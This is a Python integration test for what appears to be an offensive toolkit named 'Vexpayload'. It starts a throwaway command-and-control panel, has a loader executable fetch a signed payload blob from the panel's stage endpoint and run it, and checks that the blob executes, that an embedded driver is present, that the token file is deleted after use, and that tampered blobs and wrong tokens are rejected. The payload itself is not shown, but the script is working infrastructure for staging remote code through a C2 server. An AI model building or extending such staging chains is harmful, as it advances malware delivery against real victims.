#!/usr/bin/env python3
"""Runtime staging test: signed payload blob fetched from the panel.

Starts a throwaway C2 serving dist\\stage.bin, then runs the loader with
--stage/--token and checks the payload's selftest executes. Also verifies a
tampered blob and a wrong token are rejected.
"""

import os
import shutil
import socket
import subprocess
import sys
import tempfile
import time
import urllib.request

ROOT = r"D:\Vexpayload"
LOADER = os.path.join(ROOT, "loader", "x64", "Release", "xloader.exe")
STAGE = os.path.join(ROOT, "dist", "stage.bin")
PY = sys.executable
BASE = tempfile.mkdtemp(prefix="vex_stage_")
CHECKS = []


def ok(name, cond, extra=""):
    CHECKS.append((name, bool(cond)))
    print(("PASS " if cond else "FAIL ") + name + ((" " + str(extra)) if extra else ""))


def free_port():
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    p = s.getsockname()[1]
    s.close()
    return p


def wait_port(port, timeout=20):
    end = time.time() + timeout
    while time.time() < end:
        try:
            with socket.create_connection(("127.0.0.1", port), 0.5):
                return True
        except OSError:
            time.sleep(0.2)
    return False


def start_panel(port, stage_file, token):
    env = dict(os.environ)
    env.update({
        "VEX_DB": os.path.join(BASE, f"db_{port}.sqlite"),
        "VEX_PASS": "stage-pass",
        "VEX_MASTER": "stage-master",
        "VEX_SECRET": "s" * 64,
        "VEX_PRIV": os.path.join(ROOT, "VexC2", "priv.pem"),
        "VEX_STAGE_FILE": stage_file,
        "VEX_API_TOKEN": token,
        "PORT": str(port),
        "VEX_HOST": "127.0.0.1",
    })
    return subprocess.Popen([PY, "-u", os.path.join(ROOT, "VexC2", "run_prod.py")],
                            cwd=os.path.join(ROOT, "VexC2"), env=env,
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def run_loader(url, token, timeout=120):
    return subprocess.run([LOADER, "--stage", url, "--token", token,
                           "--no-elevate", "-v", "--selftest"],
                          capture_output=True, text=True, encoding="utf-8", errors="replace", timeout=timeout)


def run_loader_token_file(url, token_path, timeout=120):
    return subprocess.run([LOADER, "--stage", url, "--token-file", token_path,
                           "--no-elevate", "-v", "--selftest"],
                          capture_output=True, text=True, encoding="utf-8", errors="replace", timeout=timeout)


def main() -> int:
    if os.environ.get("VEX_ALLOW_PAYLOAD") != "1":
        print("[-] refusing to execute the compiled payload on this host")
        print("    set VEX_ALLOW_PAYLOAD=1 only in a lab/VM")
        sys.exit(2)

    if not os.path.exists(STAGE):
        print("[-] dist\\stage.bin missing - run build.ps1")
        return 2

    port = free_port()
    panel = start_panel(port, STAGE, "vex-stage-token")
    try:
        ok("panel up", wait_port(port))
        url = f"http://127.0.0.1:{port}/api/stage"
        r = run_loader(url, "vex-stage-token")
        ok("staged payload runs", r.returncode == 0 and "selftest" in r.stdout,
           f"rc={r.returncode} {r.stdout[-120:]!r} {r.stderr[-80:]!r}")
        ok("payload selftest completed", "selftest] done" in r.stdout)
        ok("embedded driver hash", "driver_hash=1" in r.stdout)

        tokpath = os.path.join(BASE, "stage_token.txt")
        with open(tokpath, "w", encoding="ascii") as tf:
            tf.write("vex-stage-token\n")
        r = run_loader_token_file(url, tokpath)
        ok("token-file staging", r.returncode == 0 and "selftest] done" in r.stdout,
           f"rc={r.returncode}")
        ok("token file consumed", not os.path.exists(tokpath))

        r = run_loader(url, "wrong-token")
        ok("wrong token rejected", r.returncode != 0,
           f"rc={r.returncode}")

        # tampered blob: flip one byte in a copy
        tampered = os.path.join(BASE, "stage_bad.bin")
        data = bytearray(open(STAGE, "rb").read())
        data[len(data) // 2] ^= 0xFF
        open(tampered, "wb").write(data)
        port2 = free_port()
        panel2 = start_panel(port2, tampered, "vex-stage-token")
        try:
            wait_port(port2)
            r = run_loader(f"http://127.0.0.1:{port2}/api/stage", "vex-stage-token")
            ok("tampered stage rejected", r.returncode != 0, f"rc={r.returncode}")
        finally:
            panel2.terminate()
            try:
                panel2.wait(timeout=10)
            except subprocess.TimeoutExpired:
                panel2.kill()
        return 0
    finally:
        panel.terminate()
        try:
            panel.wait(timeout=10)
        except subprocess.TimeoutExpired:
            panel.kill()


if __name__ == "__main__":
    rc = 0
    try:
        rc = main()
    finally:
        bad = [n for n, s in CHECKS if not s]
        print(f"\n{len(CHECKS) - len(bad)}/{len(CHECKS)} checks passed")
        shutil.rmtree(BASE, ignore_errors=True)
    if rc:
        sys.exit(rc)
    sys.exit(0 if CHECKS and not bad else 1)
